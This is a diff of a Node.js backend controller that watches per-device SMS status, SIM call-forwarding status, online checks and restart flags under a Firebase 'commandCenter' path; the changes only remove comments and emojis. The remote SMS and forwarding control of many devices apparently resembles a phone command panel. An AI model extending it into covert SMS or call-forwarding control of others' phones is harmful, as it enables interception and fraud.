@@ -2,15 +2,11 @@ import { rtdb } from "../config/db.js";
 
 const ROOT = "commandCenter";
 
-/* ============================================================
-      GLOBAL LIVE WATCHER MAPS
-============================================================= */
+
 const smsWatchers = new Map();
 const simWatchers = new Map();
 
-/* ============================================================
-      UTILITY — STOP WATCHER
-============================================================= */
+
 function stopWatcher(map, uid) {
   if (map.has(uid)) {
     map.get(uid).off();
@@ -19,11 +15,7 @@ function stopWatcher(map, uid) {
   }
 }
 
-/* ============================================================
-      ⭐ LIVE WATCHER: SMS STATUS
-      RTDB PATH: commandCenter/smsStatus/{uid}
-      SOCKET EVENT: smsStatusUpdate
-============================================================= */
+
 function startSmsWatcher(uid, io) {
   const ref = rtdb.ref(`${ROOT}/smsStatus/${uid}`);
 
@@ -64,11 +56,7 @@ function startSmsWatcher(uid, io) {
   console.log("🎧 SMS watcher active:", uid);
 }
 
-/* ============================================================
-      ⭐ LIVE WATCHER: SIM FORWARD
-      RTDB PATH: simForwardStatus/{uid}
-      SOCKET EVENT: simForwardUpdate
-============================================================= */
+
 function startSimWatcher(uid, io) {
   const ref = rtdb.ref(`simForwardStatus/${uid}`);
 
@@ -108,9 +96,7 @@ function startSimWatcher(uid, io) {
   console.log("🎧 SIM watcher active:", uid);
 }
 
-/* ============================================================
-   ⭐ GET SMS STATUS — snapshot + start live
-============================================================= */
+
 export const getSmsStatusByDevice = async (req, res) => {
   try {
     const { uid } = req.params;
@@ -130,7 +116,6 @@ export const getSmsStatusByDevice = async (req, res) => {
       list.sort((a, b) => b.at - a.at);
     }
 
-    // start live watch
     startSmsWatcher(uid, io);
 
     return res.json({
@@ -140,23 +125,17 @@ export const getSmsStatusByDevice = async (req, res) => {
     });
 
   } catch (err) {
-    console.error("❌ getSmsStatusByDevice ERROR:", err);
+    console.error(" getSmsStatusByDevice ERROR:", err);
     return res.status(500).json({ success: false });
   }
 };
-
-/* ============================================================
-   ⭐ GET SIM FORWARD STATUS — snapshot + live
-============================================================= */
 export const getSimForwardStatus = async (req, res) => {
   try {
     const { uid } = req.params;
     const io = req.app.get("io");
 
-    // stop old watcher
     stopWatcher(simWatchers, uid);
 
-    // snapshot
     const snap = await rtdb.ref(`simForwardStatus/${uid}`).get();
     let list = [];
 
@@ -185,9 +164,6 @@ export const getSimForwardStatus = async (req, res) => {
   }
 };
 
-/* ============================================================
-   ⭐ CHECK ONLINE STATUS (same as before)
-============================================================= */
 export const saveCheckOnlineStatus = async (req, res) => {
   try {
     const { uid } = req.params;
@@ -214,10 +190,6 @@ export const saveCheckOnlineStatus = async (req, res) => {
 };
 
 
-/* ============================================================
-   ⭐ GET ALL ONLINE REPLIES (FOR ACTIVE BADGE)
-   ✅ Fix: Sirf online aur last 15 min wale devices
-============================================================= */
 export const getAllBrosReplies = async (req, res) => {
   try {
     console.log("📡 [GET] /api/brosreply-all called");
@@ -245,10 +217,8 @@ export const getAllBrosReplies = async (req, res) => {
         
         console.log(`📊 ${uid}: available="${available}", checkedAt=${checkedAt}`);
         
-        // ✅ CONDITION 1: Must be "device is online"
         const isOnline = available.includes("device is online");
         
-        // ✅ CONDITION 2: Must be within last 15 minutes
         const isRecent = Number(checkedAt) > fifteenMinutesAgo;
         
         if (isOnline && isRecent) {
@@ -259,9 +229,9 @@ export const getAllBrosReplies = async (req, res) => {
             isActive: true
           };
           activeCount++;
-          console.log(`✅ ADDED ${uid} to active devices`);
+          console.log(` ADDED ${uid} to active devices`);
         } else {
-          console.log(`❌ SKIPPED ${uid}: isOnline=${isOnline}, isRecent=${isRecent}`);
+          console.log(` SKIPPED ${uid}: isOnline=${isOnline}, isRecent=${isRecent}`);
         }
       });
     }
@@ -287,9 +257,7 @@ export const getAllBrosReplies = async (req, res) => {
   }
 };
 
-/* ============================================================
-   ⭐ GET ONLINE REPLY
-============================================================= */
+
 export const getBrosReply = async (req, res) => {
   try {
     const { uid } = req.params;
@@ -308,9 +276,7 @@ export const getBrosReply = async (req, res) => {
   }
 };
 
-/* ============================================================
-   ⭐ RESTART SET + GET (same)
-============================================================= */
+
 export const setRestart = async (req, res) => {
   try {
     const { uid } = req.params;
